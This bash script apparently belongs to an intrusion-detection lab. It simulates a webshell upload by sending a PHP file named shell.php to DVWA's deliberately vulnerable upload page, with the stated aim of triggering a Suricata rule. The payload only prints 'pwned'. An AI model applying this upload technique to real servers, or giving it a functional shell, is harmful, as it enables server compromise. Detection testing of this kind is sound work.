#!/bin/bash

set -euo pipefail

echo "[*] UC04: Webshell Upload Attempt (DVWA)"

DVWA_URL="${DVWA_URL:-http://172.30.20.10}"
DVWA_COOKIE="${DVWA_COOKIE:-security=low; PHPSESSID=test}"
CURL_TIMEOUT="${CURL_TIMEOUT:-15}"

# DVWA Upload lab endpoint.
TARGET="${DVWA_URL%/}/vulnerabilities/upload/"

echo "[*] Target: $TARGET"

# Create a tiny php payload (lab-only). We still do an HTTP multipart upload like a typical webshell attempt.
TMP_FILE="$(mktemp /tmp/dvwa-shell-XXXX.php)"
trap 'rm -f "$TMP_FILE"' EXIT

cat >"$TMP_FILE" <<'PHP'
<?php echo "pwned"; ?>
PHP

# DVWA uses form fields typically: uploaded (file), Upload (submit).
# We keep the filename as shell.php to trigger Suricata rule matching filename="*.php".
curl -sS -m "$CURL_TIMEOUT" -o /dev/null \
  -H "Cookie: $DVWA_COOKIE" \
  -F "uploaded=@${TMP_FILE};filename=shell.php;type=application/x-php" \
  -F "Upload=Upload" \
  "$TARGET"

echo "[+] Sent webshell upload attempt (lab-only)."
